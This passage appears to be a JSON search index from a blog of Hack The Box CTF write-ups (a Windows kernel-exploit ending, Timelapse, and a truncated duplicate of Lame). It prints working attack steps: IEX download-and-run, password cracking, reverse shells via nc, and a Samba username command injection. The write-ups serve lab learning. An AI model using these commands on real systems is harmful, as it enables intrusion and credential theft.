Through Python, MSF\n[*]   http://www.exploit-db.com/exploits/35236/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution, MSF\n[*]\n[M] MS14-060: Vulnerability in Windows OLE Could Allow Remote Code Execution (3000869) - Important\n[*]   http://www.exploit-db.com/exploits/35055/ -- Windows OLE - Remote Code Execution 'Sandworm' Exploit (MS14-060), PoC\n[*]   http://www.exploit-db.com/exploits/35020/ -- MS14-060 Microsoft Windows OLE Package Manager Code Execution, MSF\n[*]\n[M] MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution (3000061) - Critical\n[*]   http://www.exploit-db.com/exploits/35101/ -- Windows TrackPopupMenu Win32k NULL Pointer Dereference, MSF\n[*]\n[E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important\n[M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical\n[*] done\nStarting to test exploits from the top;\n\n\nMS16-135:\nC:\\Users\\kostas\\Desktop&gt; powershell.exe IEX(New-Object Net.Webclient).downloadString('http://10.10.14.8/MS16-135.ps1')\n      _____ _____ ___   ___     ___   ___ ___\n    |     |   __|_  | |  _|___|_  | |_  |  _|\n    | | | |__   |_| |_| . |___|_| |_|_  |_  |\n    |_|_|_|_____|_____|___|   |_____|___|___|\n\n                        [by b33f -&gt; @FuzzySec]\n\n\n  [!] Target architecture is x64 only!\n\n\nMS16-098:\nC:\\Users\\kostas\\Desktop&gt; //10.10.14.8/pub-share/ms16-098.exe\n  Microsoft Windows [Version 6.3.9600]\n  (c) 2013 Microsoft Corporation. All rights reserved.\n\nC:\\Users\\kostas\\Desktop&gt; whoami\n  nt authority\\system\n\nC:\\Users\\kostas\\Desktop&gt; type C:\\Users\\Administrator\\Desktop\\root.txt\n  51ed1b36553c8461f4552c2e92b3eeed"
  },
  {
    "objectID": "posts/2022-04-01-htb-writeup-timelapse/2022-04-01-htb-writeup-timelapse.html",
    "href": "posts/2022-04-01-htb-writeup-timelapse/2022-04-01-htb-writeup-timelapse.html",
    "title": "Timelapse - Hack The Box",
    "section": "",
    "text": "USER\n\nStep 1\nnmap:\n➜  timelapse nmap -Pn -n -p- 10.10.11.152 --open -v\n[... snip ...]\nPORT      STATE SERVICE\n53/tcp    open  domain\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5986/tcp  open  wsmans\n9389/tcp  open  adws\n49667/tcp open  unknown\n49673/tcp open  unknown\n49674/tcp open  unknown\n49696/tcp open  unknown\n51418/tcp open  unknown\n\n➜  timelapse nmap -Pn -n -p53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49696,51418 -sCV 10.10.11.152\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-03-31 15:20:24Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n| ssl-cert: Subject: commonName=dc01.timelapse.htb\n| Not valid before: 2021-10-25T14:05:29\n|_Not valid after:  2022-10-25T14:25:29\n|_ssl-date: 2022-03-31T15:21:54+00:00; +8h02m39s from scanner time.\n| tls-alpn: \n|_  http/1.1\n9389/tcp  open  mc-nmf        .NET Message Framing\n49667/tcp open  msrpc         Microsoft Windows RPC\n49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49674/tcp open  msrpc         Microsoft Windows RPC\n49696/tcp open  msrpc         Microsoft Windows RPC\n51418/tcp open  msrpc         Microsoft Windows RPC\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\n\n➜  timelapse sudo nmap -sU -p- --open 10.10.11.152 -v\n[... snip ...]\nPORT   STATE SERVICE\n53/udp open  domain\ndirb:\nN/A\nnikto:\nN/A\nffuf:\nN/A\nsmbclient:\n➜  timelapse smbclient -L 10.10.11.152\nEnter WORKGROUP\\void's password: \n\n    Sharename       Type      Comment\n    ---------       ----      -------\n    ADMIN$          Disk      Remote Admin\n    C$              Disk      Default share\n    IPC$            IPC       Remote IPC\n    NETLOGON        Disk      Logon server share \n    Shares          Disk      \n    SYSVOL          Disk      Logon server share\nrpcclient:\n➜  timelapse rpcclient -U \"\" dc01.timelapse.htb\nEnter WORKGROUP\\'s password: \nrpcclient $&gt;\n\ndc01.timelapse.htb from nmap\n\n\n\n\nStep 2\nFirst thing we find is a globally open SMB share, enumerate it.\n➜  timelapse smbclient \\\\\\\\10.10.11.152\\\\Shares\nEnter WORKGROUP\\voids password: \nTry \"help\" to get a list of possible commands.\nsmb: \\&gt; recurse on\nsmb: \\&gt; ls\n  .                                   D        0  Mon Oct 25 17:39:15 2021\n  ..                                  D        0  Mon Oct 25 17:39:15 2021\n  Dev                                 D        0  Mon Oct 25 21:40:06 2021\n  HelpDesk                            D        0  Mon Oct 25 17:48:42 2021\n\n\\Dev\n  .                                   D        0  Mon Oct 25 21:40:06 2021\n  ..                                  D        0  Mon Oct 25 21:40:06 2021\n  winrm_backup.zip                    A     2611  Mon Oct 25 17:46:42 2021\n\n\\HelpDesk\n  .                                   D        0  Mon Oct 25 17:48:42 2021\n  ..                                  D        0  Mon Oct 25 17:48:42 2021\n  LAPS.x64.msi                        A  1118208  Mon Oct 25 16:57:50 2021\n  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 16:57:46 2021\n  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 16:57:40 2021\n  LAPS_TechnicalSpecification.docx      A    72683  Mon Oct 25 16:57:44 2021\n\nsmb: \\&gt; prompt off\nsmb: \\&gt; mget *\ngetting file \\Dev\\winrm_backup.zip of size 2611 as Dev/winrm_backup.zip (23.0 KiloBytes/sec) (average 23.0 KiloBytes/sec)\ngetting file \\HelpDesk\\LAPS.x64.msi of size 1118208 as HelpDesk/LAPS.x64.msi (3627.9 KiloBytes/sec) (average 2656.7 KiloBytes/sec)\ngetting file \\HelpDesk\\LAPS_Datasheet.docx of size 104422 as HelpDesk/LAPS_Datasheet.docx (886.7 KiloBytes/sec) (average 2270.4 KiloBytes/sec)\ngetting file \\HelpDesk\\LAPS_OperationsGuide.docx of size 641378 as HelpDesk/LAPS_OperationsGuide.docx (963.6 KiloBytes/sec) (average 1548.7 KiloBytes/sec)\ngetting file \\HelpDesk\\LAPS_TechnicalSpecification.docx of size 72683 as HelpDesk/LAPS_TechnicalSpecification.docx (507.0 KiloBytes/sec) (average 1438.0 KiloBytes/sec)\nBefore going through the LAPS files, we can try to brute force the zip. Remember to beautify the hash file so that it starts and ends with $pkzip2$.\n➜  Dev unzip winrm_backup.zip \nArchive:  winrm_backup.zip\n[winrm_backup.zip] legacyy_dev_auth.pfx password: \n   skipping: legacyy_dev_auth.pfx    incorrect password\n\n➜  Dev /usr/sbin/zip2john winrm_backup.zip &gt; zip.hash\n➜  Dev vim zip.hash                                  \n➜  Dev hashcat -a0 -m17210 zip.hash /usr/share/wordlists/rockyou.txt\n[... snip ...]\n$pkzip2$1*2*2*0*965* [... snip ...] *$/pkzip2$:supremelegacy\n                                                 \nSession..........: hashcat\nStatus...........: Cracked\n\n➜  Dev unzip -P supremelegacy winrm_backup.zip \nArchive:  winrm_backup.zip\n  inflating: legacyy_dev_auth.pfx\n\n\n\nStep 3\nTry to crack the certificate (.pfx) password.\n➜  Dev /usr/share/john/pfx2john.py legacyy_dev_auth.pfx | john --wordlist=/usr/share/wordlists/rockyou.txt /dev/stdin\n[... snip ...]\nthuglegacy       (legacyy_dev_auth.pfx)\n1g 0:00:01:06 DONE (2022-03-31 12:18) 0.01499g/s 48458p/s 48458c/s 48458C/s thuglife06..thug211\nTesting the new password against LDAP, SMB and WinRM we find our first set of working creds, over LDAP legacy:thuglegacy.\n➜  timelapse crackmapexec ldap 10.10.11.152 -u legacy -p thuglegacy                                                  \nLDAP        10.10.11.152    389    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)\nLDAP        10.10.11.152    389    DC01             [+] timelapse.htb\\legacy:thuglegacy \n➜  timelapse crackmapexec smb 10.10.11.152 -u legacy -p thuglegacy\nSMB         10.10.11.152    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)\nSMB         10.10.11.152    445    DC01             [-] timelapse.htb\\legacy:thuglegacy STATUS_ACCESS_DENIED \n➜  timelapse crackmapexec winrm 10.10.11.152 -u legacy -p thuglegacy\nWINRM       10.10.11.152    5986   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:timelapse.htb)\nWINRM       10.10.11.152    5986   DC01             [*] https://10.10.11.152:5986/wsman\nWINRM       10.10.11.152    5986   DC01             [-] timelapse.htb\\legacy:thuglegacy \"HTTPConnectionPool(host='10.10.11.152', port=5985): Max retries exceeded with url: /wsman (Caused by ConnectTimeoutError(&lt;urllib3.connection.HTTPConnection object at 0x7f4a3de153a0&gt;, 'Connection to 10.10.11.152 timed out. (connect timeout=30)'))\"\nHowever, testing the ldap credentials against everything and anything results in errors.. so lets go back to the .pfx file. Reading about the .pfx we should be able to extract a .key and .crt file, which we can later use for evil-winrm login.\n➜  Dev openssl pkcs12 -in legacyy_dev_auth.pfx  -nocerts -out priv.key\nEnter Import Password: thuglegacy\nEnter PEM pass phrase: thuglegacy\nVerifying - Enter PEM pass phrase: thuglegacy\n➜  Dev openssl pkcs12 -in legacyy_dev_auth.pfx  -clcerts -nokeys -out pfx.crt\nEnter Import Password: thuglegacy\n\n➜  Dev evil-winrm -i 10.10.11.152 -c pfx.crt -k priv.key -p -u -S \nEnter PEM pass phrase: thuglegacy\n*Evil-WinRM* PS C:\\Users\\legacyy\\Documents&gt; whoami\ntimelapse\\legacyy\n*Evil-WinRM* PS C:\\Users\\legacyy\\Desktop&gt; type user.txt\n98f42c5d696089eac85401c445d1e2f9\n\n\n\n\nROOT\n\nStep 1\nWith manual information we see that the privileges are low and no interesting groups.\n*Evil-WinRM* PS C:\\Users\\legacyy\\Desktop&gt; whoami /all\nUSER INFORMATION\n----------------\n\nUser Name         SID\n================= ============================================\ntimelapse\\legacyy S-1-5-21-671920749-559770252-3318990721-1603\n\n\nGROUP INFORMATION\n-----------------\n\nGroup Name                                  Type             SID                                          Attributes\n=========================================== ================ ============================================ ==================================================\nEveryone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group\nTIMELAPSE\\Development                       Group            S-1-5-21-671920749-559770252-3318990721-3101 Mandatory group, Enabled by default, Enabled group\nAuthentication authority asserted identity  Well-known group S-1-18-1                                     Mandatory group, Enabled by default, Enabled group\nMandatory Label\\Medium Plus Mandatory Level Label            S-1-16-8448\n\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== =======\nSeMachineAccountPrivilege     Add workstations to domain     Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Enabled\nWe find three new users, Administrator, svc_deploy and TRX.\n*Evil-WinRM* PS C:\\Users&gt; ls\n\n\n    Directory: C:\\Users\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\nd-----       10/23/2021  11:27 AM                Administrator\nd-----       10/25/2021   8:22 AM                legacyy\nd-r---       10/23/2021  11:27 AM                Public\nd-----       10/25/2021  12:23 PM                svc_deploy\nd-----        2/23/2022   5:45 PM                TRX\n\n\n\nStep 2\nFrom the SMB share we found some LAPS documentation, so the privesc probably have something to do with this. Microsoft’s LAPS is a client side extension which runs a single dll that manages password (AdmPwd.dll). The dll is present in C:\\Program Files\\LAPS\\CSE\\AdmPwd.dll, download it.\n*Evil-WinRM* PS C:\\Program Files\\LAPS\\CSE&gt; download \"C:\\Program Files\\LAPS\\CSE\\AdmPwd.dll\"\nHowever we are a low privileged user so we can’t poison the dll.. For a quick win check the history and we find a new set of creds: svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV And also got code execution as user svc_deploy\n*Evil-WinRM* PS C:\\Users\\legacyy\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine&gt; type ConsoleHost_history.txt\nwhoami\nipconfig /all\nnetstat -ano |select-string LIST\n$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck\n$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force\n$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)\ninvoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}\nget-aduser -filter * -properties *\nexit\nReplicate to get a new reverse shell.\n*Evil-WinRM* PS C:\\Users\\legacyy\\Documents&gt; $so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck\n*Evil-WinRM* PS C:\\Users\\legacyy\\Documents&gt; $p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force\n*Evil-WinRM* PS C:\\Users\\legacyy\\Documents&gt; $c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)\n*Evil-WinRM* PS C:\\Users\\legacyy\\Documents&gt; invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}\ntimelapse\\svc_deploy\n\n➜  /opt impacket-smbserver share . -smb2support\n\n*Evil-WinRM* PS C:\\Users\\legacyy\\Documents&gt; invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {//10.10.14.2/share/nc64.exe 10.10.14.2 4488 -e powershell}\n\n➜  timelapse rlwrap nc -lvnp 4488                                                                                    \nlistening on [any] 4488 ...\nconnect to [10.10.14.2] from (UNKNOWN) [10.10.11.152] 52197\nWindows PowerShell \nCopyright (C) Microsoft Corporation. All rights reserved.\n\nPS C:\\Users\\svc_deploy\\Documents&gt; whoami\ntimelapse\\svc_deploy\n\n\n\nStep 3\nEnumerating the directories we find laps.ps1\nPS C:\\Users\\svc_deploy\\Desktop&gt; type laps.ps1\n$Computers = Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime\n$Computers | Sort-Object ms-Mcs-AdmPwdExpirationTime | Format-Table -AutoSize Name, DnsHostName, ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime\n$computers | Export-Csv -path c:\\users\\danny\\desktop\\\"LAPS-$((Get-Date).ToString(\"MM-dd-yyyy\")).csv\" -NoTypeInformation\nRun the script:\nPS C:\\Users\\svc_deploy\\Desktop&gt; ./laps.ps1\n\nName  DnsHostName        ms-Mcs-AdmPwd            ms-Mcs-AdmPwdExpirationTime\n----  -----------        -------------            ---------------------------\nWEB01                                                                        \nDEV01                                                                        \nDB01                                                                         \nDC01  dc01.timelapse.htb 6+e(2G,L;TK5+eGy%gJ8s.2X 132936070633235489\nA new set of creds: Administrator:6+e(2G,L;TK5+eGy%gJ8s.2X\nPS C:\\Users\\svc_deploy\\Desktop&gt; $so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck\nPS C:\\Users\\svc_deploy\\Desktop&gt; $p = ConvertTo-SecureString '6+e(2G,L;TK5+eGy%gJ8s.2X' -AsPlainText -Force\nPS C:\\Users\\svc_deploy\\Desktop&gt; $c = New-Object System.Management.Automation.PSCredential ('Administrator', $p)\nPS C:\\Users\\svc_deploy\\Desktop&gt; invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}\ntimelapse\\administrator\n\nPS C:\\Users\\svc_deploy\\Desktop&gt; invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {//10.10.14.2/share/nc64.exe 10.10.14.2 4499 -e powershell}\n\n➜  timelapse rlwrap nc -lvnp 4499\nlistening on [any] 4499 ...\nconnect to [10.10.14.2] from (UNKNOWN) [10.10.11.152] 64806\nWindows PowerShell \nCopyright (C) Microsoft Corporation. All rights reserved.\n\nPS C:\\Users\\Administrator\\Documents&gt; whoami\ntimelapse\\administrator\n\n\n\nStep 4\nThe flag, root.txt, is not in it’s normal directory (C:\\Users\\Administrator\\Desktop\\root.txt). Looking around we find the flag in user TRX directory.\nPS C:\\Users\\TRX\\Desktop&gt; type root.txt\n5f0405eed578c041a6f9ad86d0318e82\n\n\n\n\nReferences\n.pfx to .key & .crt: https://medium.com/beingcoders/easy-way-to-convert-pfx-to-crt-key-files-in-10-minutes-683849242c65"
  },
  {
    "objectID": "posts/2019-04-12-htb-writeup-lame/2019-04-12-htb-writeup-lame.html",
    "href": "posts/2019-04-12-htb-writeup-lame/2019-04-12-htb-writeup-lame.html",
    "title": "Lame - Hack The Box",
    "section": "",
    "text": "root@nidus:/git/thm# nmap -Pn -sC -sV -n 10.10.10.3\n  Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-30 10:09 CEST\n  Nmap scan report for 10.10.10.3\n  Host is up (0.035s latency).\n  Not shown: 996 filtered ports\n  PORT    STATE SERVICE     VERSION\n  21/tcp  open  ftp         vsftpd 2.3.4\n  |_ftp-anon: Anonymous FTP login allowed (FTP code 230)\n  | ftp-syst:\n  |   STAT:\n  | FTP server status:\n  |      Connected to 10.10.14.4\n  |      Logged in as ftp\n  |      TYPE: ASCII\n  |      No session bandwidth limit\n  |      Session timeout in seconds is 300\n  |      Control connection is plain text\n  |      Data connections will be plain text\n  |      vsFTPd 2.3.4 - secure, fast, stable\n  |_End of status\n  22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)\n  | ssh-hostkey:\n  |   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)\n  |_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)\n  139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n  445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)\n  Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\n  Host script results:\n  |_clock-skew: mean: -3d00h51m31s, deviation: 2h49m45s, median: -3d02h51m34s\n  | smb-os-discovery:\n  |   OS: Unix (Samba 3.0.20-Debian)\n  |   Computer name: lame\n  |   NetBIOS computer name:\n  |   Domain name: hackthebox.gr\n  |   FQDN: lame.hackthebox.gr\n  |_  System time: 2020-07-27T01:17:55-04:00\n  | smb-security-mode:\n  |   account_used: guest\n  |   authentication_level: user\n  |   challenge_response: supported\n  |_  message_signing: disabled (dangerous, but default)\n  |_smb2-time: Protocol negotiation failed (SMB2)\n\n\nLogin in to the ftp with anonymous:anonymous we find nothing of use. Enumerate the SMB shares using smbmap and smbclient.\nroot@nidus:/git/htb/lame# smbmap -H 10.10.10.3\n[+] IP: 10.10.10.3:445  Name: 10.10.10.3\n        Disk                                                    Permissions Comment\n  ----                                                      ----------- -------\n  print$                                                NO ACCESS   Printer Drivers\n  tmp                                                   READ, WRITE oh noes!\n  opt                                                   NO ACCESS\n  IPC$                                                  NO ACCESS   IPC Service (lame server (Samba 3.0.20-Debian))\n  ADMIN$                                                NO ACCESS   IPC Service (lame server (Samba 3.0.20-Debian))\nThe share tmp seems interesting, both read and write permissions - lets enumerate more there.\n\nNOTE:\nIf you’re experiencing this error when trying to list with smbclient: “protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED”. Then go ahead and add the following two lines to /etc/samba/smb.conf under [global]:\n client min protocol = NT1\n client max protocol = SMB3\n\nroot@nidus:/git/htb/lame# smbclient \\\\\\\\10.10.10.3\\\\tmp\n  smb: \\&gt; ls\n  .                                   D        0  Mon Jul 27 07:50:50 2020\n  ..                                 DR        0  Sun May 20 20:36:12 2012\n  5145.jsvc_up                        R        0  Mon Jul 27 07:17:46 2020\n  .ICE-unix                          DH        0  Mon Jul 27 07:16:41 2020\n  .X11-unix                          DH        0  Mon Jul 27 07:17:08 2020\n  .X0-lock                           HR       11  Mon Jul 27 07:17:08 2020\nThere’s nothing of direct use for us in here either. Instead we change the approach and look for known samba vulnerabilities.\nUsing searchsploit we look for any direct vulnerabilities of Samba version 3.0.20.\nroot@nidus:/git/htb/lame# searchsploit samba 3.0.20\n  ---------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n    Exploit Title                                                                                                              |  Path\n  ---------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n  ..\n  Samba 3.0.20 &lt; 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                            | unix/remote/16320.rb\n  ---------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nDirect we find a msf module available. Turns out this module gives us instant root. Grab root.txt and user.txt\n  msf5 auxiliary(scanner/ssh/ssh_enumusers) &gt; use exploit/multi/samba/usermap_script\n  msf5 exploit(multi/samba/usermap_script) &gt; set lhost 10.10.14.4\n  msf5 exploit(multi/samba/usermap_script) &gt; set rhost 10.10.10.3\n  msf5 exploit(multi/samba/usermap_script) &gt; run\n\n    [*] Started reverse TCP handler on 10.10.14.4:4444\n    [*] Command shell session 1 opened (10.10.14.4:4444 -&gt; 10.10.10.3:46617) at 2020-07-30 10:53:52 +0200\n\n    whoami\n      root\n    pwd\n      /\n    cat /root/root.txt\n      92caac3be140ef409e45721348a4e9df\n    ls -al /home\n      total 24\n      drwxr-xr-x  6 root    root    4096 Mar 14  2017 .\n      drwxr-xr-x 21 root    root    4096 May 20  2012 ..\n      drwxr-xr-x  2 root    nogroup 4096 Mar 17  2010 ftp\n      drwxr-xr-x  2 makis   makis   4096 Mar 14  2017 makis\n      drwxr-xr-x  2 service service 4096 Apr 16  2010 service\n      drwxr-xr-x  3    1001    1001 4096 May  7  2010 user\n    cat /home/makis/user.txt\n      69454a937d94f5f0225ea00acd2e84c5\n\n\n\nLogging in as anonymous user on the smb-service we find that ‘logon’ option is available. We can exploit this directly to get a reverse shell.\n(a) Verify options with ‘?’ or ‘help’\nsmbclient \\\\\\\\10.10.10.3\\\\tmp\\\\\nsmb: \\&gt; ?\n  [..]\n  wdel           logon          listconnect    showconnect    tcon\n(b) Setup a reverse shell to your box\nsmb: \\&gt; logon \"./=`nohup nc -e /bin/sh 10.10.14.10 4488`\"\n  Password:\n  session setup failed: NT_STATUS_IO_TIMEOUT\n(c) Grab the incomming session\n[root:/git/htb/lame]# nc -lvnp 4488                                                                                               (master✱)\nlistening on [any] 4488 ...\nconnect to [10.10.14.10] from (UNKNOWN) [10.10.10.3] 58543\n  whoami\n  root\n  python -c 'import pty;pty.spawn(\"/bin/bash\")';\n  root@lame:/root# cat root.txt\n    cat root.txt\n    744e9fa96f4e8423020ccb841c60e4d2"
  },
  {
    "objectID": "posts/2019-04-12-htb-writeup-lame/2019-04-12-htb-writeup-lame.html#enumeration",
    "href": "posts/2019-04-12-htb-writeup-lame/2019-04-12-htb-writeup-lame.html#enumeration",
    "title": "Lame - Hack The Box",
    "section": "",
    "text": "root@nidus:/git/thm# nmap -Pn -sC -sV -n 10.10.10.3\n  Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-30 10:09 CEST\n  Nmap scan report for 10.10.10.3\n  Host is up (0.035s latency).\n  Not shown: 996 filtered ports\n  PORT    STATE SERVICE     VERSION\n  21/tcp  open  ftp         vsftpd 2.3.4\n  |_ftp-anon: Anonymous FTP login allowed (FTP code 230)\n  | ftp-syst:\n  |   STAT:\n  | FTP server status:\n  |      Connected to 10.10.14.4\n  |      Logged in as ftp\n  |      TYPE: ASCII\n  |      No session bandwidth limit\n  |      Session timeout in seconds is 300\n  |      Control connection is plain text\n  |      Data connections will be plain text\n  |      vsFTPd 2.3.4 - secure, fast, stable\n  |_End of status\n  22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)\n  | ssh-hostkey:\n  |   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)\n  |_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)\n  139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n  445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)\n  Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\n  Host script results:\n  |_clock-skew: mean: -3d00h51m31s, deviation: 2h49m45s, median: -3d02h51m34s\n  | smb-os-discovery:\n  |   OS: Unix (Samba 3.0.20-Debian)\n  |   Computer name: lame\n  |   NetBIOS computer name:\n  |   Domain name: hackthebox.gr\n  |   FQDN: lame.hackthebox.gr\n  |_  System time: 2020-07-27T01:17:55-04:00\n  | smb-security-mode:\n  |   account_used: guest\n  |   authentication_level: user\n  |   challenge_response: supported\n  |_  message_signing: disabled (dangerous, but default)\n  |_smb2-time: Protocol negotiation failed (SMB2)\n\n\nLogin in to the ftp with anonymous:anonymous we find nothing of use. Enumerate the SMB shares using smbmap and smbclient.\nroot@nidus:/git/htb/lame# smbmap -H 10.10.10.3\n[+] IP: 10.10.10.3:445  Name: 10.10.10.3\n        Disk                                                    Permissions Comment\n  ----                                                      ----------- -------\n  print$                                                NO ACCESS   Printer Drivers\n  tmp                                                   READ, WRITE oh noes!\n  opt                                                   NO ACCESS\n  IPC$                                                  NO ACCESS   IPC Service (lame server (Samba 3.0.20-Debian))\n  ADMIN$                                                NO ACCESS   IPC Service (lame server (Samba 3.0.20-Debian))\nThe share tmp seems interesting, both read and write permissions - lets enumerate more there.\n\nNOTE:\nIf you’re experiencing this error when trying to list with smbclient: “protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED”. Then go ahead and add the following two lines to /etc/samba/smb.conf under [global]:\n client min protocol = NT1\n client max protocol = SMB3\n\nroot@nidus:/git/htb/lame# smbclient \\\\\\\\10.10.10.3\\\\tmp\n  smb: \\&gt; ls\n  .                                   D        0  Mon Jul 27 07:50:50 2020\n  ..                                 DR        0  Sun May 20 20:36:12 2012\n  5145.jsvc_up                        R        0  Mon Jul 27 07:17:46 2020\n  .ICE-unix                          DH        0  Mon Jul 27 07:16:41 2020\n  .X11-unix                          DH        0  Mon Jul 27 07:17:08 2020\n  .X0-lock                           HR       11  Mon Jul 27 07:17:08 2020\nThere’s nothing of direct use for us in here either. Instead we change the approach and look for known samba vulnerabilities.\nUsing searchsploit we look for any direct vulnerabilities of Samba version 3.0.20.\nroot@nidus:/git/htb/lame# searchsploit samba 3.0.20\n  ---------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n    Exploit Title                                                                                                              |  Path\n  ---------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n  ..\n  Samba 3.0.20 &lt; 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                            | unix/remote/16320.rb\n  ---------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nDirect we find a msf module available. Turns out this module gives us instant root. Grab root.txt and user.txt\n  msf5 auxiliary(scanner/ssh/ssh_enumusers) &gt; use exploit/multi/samba/usermap_script\n  msf5 exploit(multi/samba/usermap_script) &gt; set lhost 10.10.14.4\n  msf5 exploit(multi/samba/usermap_script) &gt; set rhost 10.10.10.3\n  msf5 exploit(multi/samba/usermap_script) &gt; run\n\n    [*] Started reverse TCP handler on 10.10.14.4:4444\n    [*] Command shell session 1 opened (10.10.14.4:4444 -&gt; 10.10.10.3:46617) at 2020-07-30 10:53:52 +0200\n\n    whoami\n      root\n    pwd\n      /\n    cat /root/root.txt\n      92caac3be140ef409e45721348a4e9df\n    ls -al /home\n      total 24\n      drwxr-xr-x  6 root    root    4096 Mar 14  2017 .\n      drwxr-xr-x 21 root    root    4096 May 20  2012 ..\n      drwxr-xr-x  2 root    nogroup 4096 Mar 17  2010 ftp\n      drwxr-xr-x  2 makis   makis   4096 Mar 14  2017 makis\n      drwxr-xr-x  2 service service 4096 Apr 16  2010 service\n      drwxr-xr-x  3    1001    1001 4096 May  7  2010 user\n    cat /home/makis/user.txt\n      69454a937d94f5f0225ea00acd2e84c5\n\n\n\nLogging in as anonymous user on the smb-service we find that ‘logon’ option is available. We can exploit this directly to get a reverse shell.\n(a) Verify options with ‘?’ or ‘help’\nsmbclient 